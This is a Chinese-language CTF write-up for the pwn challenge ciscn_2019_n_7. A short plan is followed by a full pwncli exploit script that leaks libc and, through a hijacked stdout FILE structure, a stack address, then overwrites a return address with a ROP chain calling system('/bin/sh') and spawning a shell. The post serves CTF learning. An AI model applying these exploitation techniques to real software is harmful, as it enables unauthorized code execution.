# ciscn_2019_n_7



### 解题思路

- 利用溢出修改指针的洞，将指针修改到`stdout`结构体上方，修改`flag`为`0xfbad1800`，然后修改`IO_write_base`为`__environ`地址，`IO_write_ptr`为`__environ + 8`地址，泄露栈地址
- 劫持`__libc_start_main`栈帧的`retaddr`，使用`rop`执行`system("/bin/sh")`
- 这里用`pwncli`来写`exp`，只图高效，快捷

<!-- more -->

### exp

```python
#!/usr/bin/python3
from pwncli import *

cli_script()

if gift['remote']:
    libc = ELF('libc-2.23.so')
elif gift['debug']:
    libc = gift['libc']

def add_page(p, size, name):
    p.sendlineafter("Your choice-> \n","1")
    p.sendlineafter("Length: \n", str(size))
    p.sendafter("name:\n", name)
    p.recvline()
    
def edit_page(p, name, content):
    p.sendlineafter("Your choice-> \n","2")
    p.recvline()
    p.send(name)
    p.sendafter("contents:\n", content)
    

def show_page(p):
    p.sendlineafter("Your choice-> \n","3")
    msg1 = p.recvline()
    msg2 = p.recvline()
    return msg1, msg2
    
def get_gift(p):
    p.sendlineafter("Your choice-> \n","666")
    msg = p.recvline()
    info(msg)
    return msg


def attack(p):
    # leak libc addr
    leak_libc_addr = int16(get_gift(p).decode())
    libc.address = leak_libc_addr - libc.sym['puts']
    log_address("libc base addr", libc.address)

    stdout_addr = libc.sym['_IO_2_1_stdout_']
    environ_addr = libc.sym['__environ']

    # hijack stdout to leak stack addr
    add_page(p, 0x100, flat(0xdeadbeef, stdout_addr))
    edit_page(p, "a", flat([0xfbad1800, [environ_addr] * 4, environ_addr + 8]))
    # get stack addr
    leak_stack_addr = u64(p.recvn(8))
    log_address("leak_stack_addr", leak_stack_addr)
    stackframe_ret_addr = leak_stack_addr - 0xf0
    # rop
    bin_sh_offset = libc.search(b"/bin/sh").__next__()
    rop = ROP(libc, base=libc.address)
    rop.call('system', [bin_sh_offset])
    payload = rop.chain()

    p.sendlineafter("Your choice-> ","2")
    p.sendafter("name:", flat(0xdeadbeef, stackframe_ret_addr))
    p.sendafter("contents:", payload)
    p.sendlineafter("Your choice-> ","5")
    
    p.interactive()
    
    
attack(gift['io'])

    
```



### 引用与参考
1、[My Blog](https://roderickchan.github.io)

2、[Ctf Wiki](https://ctf-wiki.org/)

3、[pwncli](https://github.com/RoderickChan/pwncli)

---

> 作者: [roderick](https://roderickchan.github.io)  
> URL: https://roderickchan.github.io/zh-cn/2021-07-18-ciscn-2019-n-7/  

